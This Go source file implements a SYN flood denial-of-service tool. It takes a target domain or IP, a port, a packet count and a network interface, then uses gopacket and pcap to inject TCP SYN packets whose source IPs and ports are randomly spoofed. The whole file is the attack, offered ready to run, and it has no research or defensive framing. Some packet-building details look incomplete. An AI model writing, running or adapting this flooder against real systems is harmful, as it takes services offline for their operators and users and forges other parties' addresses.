package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Random fake IP address
func randomIP(randSource *rand.Rand) net.IP {
	return net.IPv4(
		byte(1+randSource.Intn(254)), // Random byte 1-254
		byte(randSource.Intn(256)),   // Random byte 0-255
		byte(randSource.Intn(256)),   // Random byte 0-255
		byte(randSource.Intn(256)),   // Random byte 0-255
	)
}

// Function to resolve DNS to IP (with caching)
var dnsCache = make(map[string]net.IP)

func resolveDNS(domain string) (net.IP, error) {
	// Check if the domain is already cached
	if ip, exists := dnsCache[domain]; exists {
		log.Printf("Cache hit for domain %s: %s", domain, ip)
		return ip, nil
	}

	// Resolve the domain if not cached
	ips, err := net.LookupIP(domain)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve DNS: %v", err)
	}

	// Cache the resolved IP
	dnsCache[domain] = ips[0]
	log.Printf("Resolved DNS for domain %s to IP %s", domain, ips[0])

	return ips[0], nil
}

func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.Rand, networkInterface string, wg *sync.WaitGroup, handle *pcap.Handle) {
	log.Printf("Starting SYN flood on %s:%d with %d packets\n", target, port, numPackets)

	for i := 0; i < numPackets; i++ { // Send numPackets packets
		wg.Add(1)
		go func(i int) {
			ipLayer := &layers.IPv4{
				SrcIP:    randomIP(randSource), // Use random source IP address for each packet
				DstIP:    net.ParseIP(target),  // Target IP address
				Protocol: layers.IPProtocolTCP,
			}

			log.Printf("Sending packet #%d from %s to %s:%d", i+1, ipLayer.SrcIP, ipLayer.DstIP, port)

			tcpLayer := &layers.TCP{
				SrcPort: layers.TCPPort(randSource.Intn(65535)), // Random source port
				DstPort: layers.TCPPort(port),                   // Target port
				SYN:     true,
				Window:  14600,
			}

			// Calculate TCP checksum
			err := tcpLayer.SetNetworkLayerForChecksum(ipLayer)
			if err != nil {
				log.Printf("Failed to set checksum: %v", err)
				wg.Done()
				return
			}

			// Create buffer and serialize layers
			buffer := gopacket.NewSerializeBuffer()
			options := gopacket.SerializeOptions{ComputeChecksums: true, FixLengths: true}
			err = gopacket.SerializeLayers(buffer, options, ipLayer, tcpLayer)
			if err != nil {
				log.Printf("Failed to serialize layers: %v", err)
				wg.Done()
				return
			}

			// Send the packet
			err = handle.WritePacketData(buffer.Bytes())
			if err != nil {
				log.Printf("Failed to send packet: %v", err)
			}

			// Log the packet being sent
			log.Printf("Sent packet #%d", i+1)
			wg.Done()
		}(i)

		// Introduce a small delay to control the rate
		time.Sleep(10 * time.Millisecond)
	}

	// Wait for all goroutines to finish
	wg.Wait()
	log.Println("SYN flood completed. Program will now stop.")
}

func main() {
	// Command-line arguments
	interfaceFlag := flag.String("interface", "en0", "Network interface to use (e.g., en0, eth0, etc.)")
	targetFlag := flag.String("target", "example.com", "Target domain name or IP address")
	portFlag := flag.Uint("port", 80, "Target port")
	numPacketsFlag := flag.Int("numPackets", 1000, "Number of packets to send")

	flag.Parse()

	// Seed random number generator
	randSource := rand.New(rand.NewSource(time.Now().UnixNano()))

	// Get the network interface, target IP, port, and number of packets from the command line
	networkInterface := *interfaceFlag
	target := *targetFlag
	port := uint16(*portFlag)
	numPackets := *numPacketsFlag

	// Resolve DNS if target is a domain name
	targetIP := net.ParseIP(target)
	if targetIP == nil { // If the target is a domain name, resolve it
		var err error
		targetIP, err = resolveDNS(target)
		if err != nil {
			log.Fatalf("Error resolving domain: %v", err)
		}
	}

	// Open the network interface for packet injection
	handle, err := pcap.OpenLive(networkInterface, 1024, false, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Failed to open device: %v", err)
	}
	defer handle.Close()

	log.Printf("Launching SYN Flood on %s:%d with %d packets using interface %s\n", targetIP, port, numPackets, networkInterface)

	// Start the SYN Flood attack
	var wg sync.WaitGroup
	sendSynFlood(targetIP.String(), port, numPackets, randSource, networkInterface, &wg, handle)

	// Wait for all Goroutines to complete
	wg.Wait()

}
